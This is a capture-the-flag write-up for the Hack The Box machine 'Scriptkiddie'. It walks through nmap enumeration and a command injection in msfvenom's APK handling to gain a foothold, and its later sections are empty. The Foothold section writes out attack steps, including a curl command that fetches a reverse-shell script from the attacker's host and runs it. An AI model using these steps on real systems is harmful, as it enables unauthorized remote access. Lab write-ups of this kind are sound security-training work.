![](template-writeup/assets/images/banner.png)

# Scriptkiddie


### Description:

This machine simualtes a user using hacker tools in a webpage where you can abuse an old version of msfvenom, then exploit a cron to get lateral movement and finally abusing sudo rights to msfconsole. definetly a fun box.


### Difficulty:

`easy`


# Enumeration

First, we run `nmap` to know what ports are in use .

```sudo nmap -sC -sV -oA nmap/script 10.10.10.226```

![[Pasted image 20220207101557.png]]

we see port 22 (ssh) and port 5000 (python werkzeurg webserver), if we go to that webpage, we see this tools:

![[Pasted image 20220207141415.png]]

`nmap`  and `searchsploit` have sanitized input, so we can't vulnerate them. 
A quick search in google showed that `msfvenom` has a [vulnerability](https://www.exploit-db.com/exploits/49491) that allow us to inject a command using a corruped APK. 



# Foothold

To verify that the script works, we modify the command to inject in the script to be a `ping` to our ip. 

![[Pasted image 20220207142846.png]]

So, we generate the payload, upload it, and set a `tcpdump` listening to icmp requests.

![[Pasted image 20220207105342.png]]

Now, we know that the script works, so we can try to inject a reverse shell.
BUT, to be honest, any reverse shell that i tried didn't work (idk why), so i did the following steps:

* Injected a simple http server onto the machine to verify the file structure and if i can inject files:  `python3 -m http.server`
*  Created a .sh file that contains a reverse shell in pyhon.
*  Upload the file injecting a curl command into the apk:  `curl 10.10.14.15:8000/reverse.sh`
*  Verified that the file was uploaded:
![[Pasted image 20220207143323.png]]
* Set a listening port on my local machine and run the exploit injecting a `sh exploit.sh`

and voila.

![[Pasted image 20220207143852.png]]
 
# Lateral Movement

Now that we're in, we can enumerate the users, 



# Privilege Escalation

